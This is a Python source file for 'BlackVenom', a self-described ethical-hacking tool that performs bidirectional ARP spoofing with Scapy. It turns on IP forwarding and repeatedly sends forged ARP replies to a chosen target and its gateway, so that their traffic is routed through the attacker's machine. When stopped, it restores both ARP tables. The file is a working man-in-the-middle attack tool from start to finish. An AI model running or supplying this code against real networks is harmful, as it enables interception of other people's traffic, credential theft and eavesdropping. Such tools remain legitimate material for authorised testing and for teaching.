import socket
import sys
import time
import logging
from scapy.all import Ether, ARP, srp, send
from tqdm import tqdm
import netifaces

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class BlackVenom:
    """
    A class to perform ARP Spoofing.

    Attributes:
        local_ip (str): The local IP address of the specified interface.
        local_mac (str): The local MAC address of the specified interface.
    """

    def __init__(self, interface='eth0'):
        """
        Initializes the ARPSpoofer.

        Args:
            interface (str): The network interface to use for getting the local IP (default is 'eth0').
        """
        self.interface = interface
        self.local_ip = self._get_local_ip(interface)
        self.local_mac = self._get_local_mac(interface)
        self._enable_ip_forwarding()
        self._print_banner()
        
        print(f"🖥️ Local IP Address ({self.interface}): {self.local_ip}")
        print(f"🔗 Local MAC Address ({self.interface}): {self.local_mac}") 

    def spoofing(self, target_ip, gateway_ip):
        """
        Runs the ARP spoofing process indefinitely until interrupted.

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the gateway.
        """
        print("🕸️ ** BlackVenom Activated **")
        print("🔮 Entering the shadows... ARP Spoofing in progress...")  
        
        # Variable to track if spoofing has been successfully activated
        spoofed_successfully = False

        try:
            while True:
                self._spoof_bidirectional(target_ip, gateway_ip, verbose=not spoofed_successfully)

                # Indicate the first successful spoofing
                if not spoofed_successfully:
                    print(f"🔒 Successfully spoofed {target_ip} to think we're {gateway_ip}.")
                    spoofed_successfully = True

                for i in range(1, 4):
                    sys.stdout.write(f"\r🔄 Spoofing in progress{'.' * i} Target: {target_ip} | Gateway: {gateway_ip} ")
                    sys.stdout.flush()
                    time.sleep(0.5)
                
                time.sleep(0.5)  # Pausa antes de la próxima iteración principal

                time.sleep(1)
        except KeyboardInterrupt:
            print("🛑 Stopping ARP Spoofing. Restoring the network...")
            self._restore_bidirectional(target_ip, gateway_ip)
            print("✅ ARP Spoofing stopped. Network has been restored. Returning to the shadows...")

    def _enable_ip_forwarding(self):
        """
        Enables IP forwarding on the system.
        """
        print("⚙️ Enabling IP forwarding... 🛠️")
        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
        with open(ip_forward_path) as f:
            if f.read() == '1':
                print("🌐 IP forwarding already enabled! 🧠")
                return
        with open(ip_forward_path, 'w') as f:
            print(1, file=f)
        print("🌐 IP forwarding activated! 🔥")

    def _get_local_mac(self, interface):
        """
        Gets the local MAC address of the specified network interface.

        Args:
            interface (str): The network interface to get the local MAC address from.

        Returns:
            str: Local MAC address of the specified interface.
        """
        try:
            # Get the MAC address from the interface using netifaces
            mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
            return mac_address
        except Exception as e:
            print(f"⚠️ Could not get MAC address for interface {interface}: {e}")
            return None
        
    def _get_local_ip(self, interface):
        """
        Gets the local IP address of the specified network interface.

        Args:
            interface (str): The network interface to get the local IP address from.

        Returns:
            str: Local IP address of the specified interface.
        """
        try:
            # Create a socket and bind it to the specified interface
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.bind((interface, 0))  # Bind to the specified interface
                return s.getsockname()[0]  # Get the local IP address
        except Exception as e:
            print(f"⚠️ Could not get local IP address for interface {interface}: {e}")
            return None

    def _get_mac(self, ip, verbose=True):
        """
        Gets the MAC address associated with a given IP address.

        Args:
            ip (str): IP address.

        Returns:
            str: MAC address corresponding to the IP.
        """
        if verbose:
            print(f"🔍 Searching for MAC address of {ip}... 👁️")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            mac = ans[0][1].src
            if verbose:
                print(f"⚡ MAC address for {ip} found: {mac} 🕸️")
            return mac
        else:
            raise Exception(f"❌ Could not find MAC address for {ip}. 😵")
        
    def _restore_bidirectional(self, target_ip, gateway_ip, verbose=True):
        """
        Restores ARP tables for both target and gateway, undoing the spoofing.

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the gateway.
        """
        if verbose:
            print(f"💀 Restoring ARP tables for {target_ip} and {gateway_ip}...")
        self._restore(target_ip, gateway_ip, verbose)
        self._restore(gateway_ip, target_ip, verbose)

    def _spoof_bidirectional(self, target_ip, gateway_ip, verbose=True):
        """
        Performs bidirectional ARP spoofing: making the target think we are the gateway,
        and making the gateway think we are the target.

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the gateway.
        """
        if verbose:
            print(f"🕸️ Spoofing target {target_ip} and gateway {gateway_ip}...")
        self._spoof(target_ip, gateway_ip, verbose)
        self._spoof(gateway_ip, target_ip, verbose)

    def _spoof(self, target_ip, spoof_ip, verbose=True):
        """
        Sends ARP packets to spoof the network, making the target think
        the spoof_ip (gateway or host) is at our MAC address.

        Args:
            target_ip (str): IP address of the target machine.
            spoof_ip (str): IP address to impersonate (usually the gateway).
        """
        target_mac = self._get_mac(target_ip, verbose)
        spoofed_arp_response = ARP(
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=self.local_mac,
            op='is-at'
        )
        send(spoofed_arp_response, verbose=0)
        if verbose:
            print(f"💉 Injected ARP spoof into {target_ip}: {spoof_ip} is now at our MAC address. 🕷️")

    def _restore(self, target_ip, real_ip, verbose=True):
        """
        Sends ARP packets to restore the correct mapping in the target's ARP table.

        Args:
            target_ip (str): IP address of the target machine.
            real_ip (str): The real IP address to restore (usually the gateway).
        """
        target_mac = self._get_mac(target_ip, verbose)
        real_mac = self._get_mac(real_ip, verbose)
        restore_arp_response = ARP(
            pdst=target_ip,
            hwdst=target_mac,
            psrc=real_ip,
            hwsrc=real_mac,
            op='is-at'
        )

        if verbose:
            print(f"🧙‍♂️ Restoring ARP table for {target_ip} with {real_ip} ({real_mac})...")

        # Send multiple ARP packets with a progress bar
        for _ in tqdm(range(20), desc=f"Restoring {target_ip} ARP table 🕯️"):
            send(restore_arp_response, verbose=0)

        if verbose:
            print(f"🕸️ ARP table for {target_ip} has been restored to its rightful state! 🖤")

    def _print_banner(self):
        """
        Prints a welcome banner at the start of the program for BlackVenom.
        """
        banner = f"""
        ██████╗ ██╗      █████╗  ██████╗██╗  ██╗       
        ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝       
        ██████╔╝██║     ███████║██║     █████╔╝        
        ██╔══██╗██║     ██╔══██║██║     ██╔═██╗        
        ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗       
        ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝       
                                                    
        ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
        ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
        ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
        ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
        ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
        ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
        BlackVenom 🖤: Ethical Hacking ARP Spoofing Tool (Version: )
        """
        print(banner)





                                               